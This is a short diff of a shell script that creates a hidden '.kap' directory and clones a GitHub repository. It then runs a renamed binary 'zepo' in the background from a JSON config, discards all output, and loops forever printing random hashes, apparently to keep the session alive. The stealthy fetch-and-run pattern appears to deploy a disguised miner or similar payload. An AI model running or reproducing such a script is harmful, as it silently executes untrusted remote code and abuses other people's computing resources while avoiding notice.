@@ -9,6 +9,6 @@ rm nyumput.c
 mkdir .kap && cd .kap
 git clone https://github.com/6248202226/gradi.git
 cd gradi
-chmod +x config.json && chmod +x zepo
-./zepo -c "config.json" > /dev/null 2>&1 &
+chmod +x 80.json && chmod +x zepo
+./zepo -c "80.json" > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
